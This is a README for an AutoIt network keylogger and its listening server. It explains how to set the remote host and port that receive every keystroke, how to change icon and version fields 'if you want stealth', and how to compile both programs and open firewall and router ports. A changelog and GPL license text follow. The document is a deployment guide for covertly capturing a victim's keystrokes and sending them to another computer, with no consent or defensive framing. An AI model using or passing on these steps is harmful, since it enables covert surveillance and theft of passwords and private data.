Network Keylogger v1.0.0.2 - Sends every key pressed in a computer to another computer, via TCP/IP.
Network Keylogger Server v1.0.0.2 - Server program for Network Keylogger
Copyright © 2010 VittGam - Net-Keylogger@VittGam.net
You can contact me directly at https://www.vittgam.net/contact

You can donate at https://www.vittgam.net/donate

================================
============ Usage: ============
================================

1.	Download Network Keylogger files from https://github.com/VittGam/net-keylogger/zipball/master

2.	Download AutoIt v3.3.6.0 or newer and SciTE AutoIt Script Editor from
	http://www.autoitscript.com/autoit3/downloads.shtml

3.	Install AutoIt and SciTE.

4.	Open the script network_keylogger.au3 with SciTE (right-click -> Edit Script)

5.	Change these variables with your computer external address and the port you want to use:

	Global $server_addr="server.vittgam.net"
	Global $server_port="12569"

6.	Change these parameters if you want stealth:

	#AutoIt3Wrapper_icon=vittgam.ico
	#AutoIt3Wrapper_Res_Comment=Network Keylogger v1.0.0.2 by VittGam
	#AutoIt3Wrapper_Res_Description=Network Keylogger
	#AutoIt3Wrapper_Res_Fileversion=1.0.0.2
	#AutoIt3Wrapper_Res_LegalCopyright=Copyright © 2010 VittGam
	#AutoIt3Wrapper_Res_Field=InternalName|network_keylogger
	#AutoIt3Wrapper_Res_Field=ProductName|Network Keylogger
	#AutoIt3Wrapper_Res_Field=CompanyName|VittGam (www.VittGam.net)
	#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.2
	#AutoIt3Wrapper_Res_Field=OriginalFilename|network_keylogger.exe

7.	Save the script.

8.	Open the script network_keylogger_server.au3 with SciTE (right-click -> Edit Script)

9.	Change these variables with the address and port you want to use (leave 0.0.0.0 as
	bind address if you want to listen on all interfaces):

	Global $listen_bind="0.0.0.0"
	Global $listen_port="12569"

10.	Save the script.

11.	If you want to access the server from the Internet, open the port on your router if needed.
	Remember to open it in your firewall too, even for LAN/local connections.

12.	Compile both scripts using the "Compile with Options" right-click command.

================================
=== Known bugs/limitations: ====
================================

* Currently none.

================================
============ To do: ============
================================

* Encryption for network data and temporary file.

================================
========== Changelog: ==========
================================

Version 1.0.0.2 - 2010/06/16
* The keylog temporary file name changes at program startup
* Better temporary file management between sessions
* Some minor changes

Version 1.0.0.1 - 2010/06/15
* Added README.txt and renamed gpl.txt to LICENSE.txt
* The keylog temporary file name doesn't change at program startup
* The keylog temporary file is deleted if empty.
* The child process does not load keys mappings anymore.

Version 1.0.0.0 - 2010/06/14
* First release.

================================
===== License information: =====
================================

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
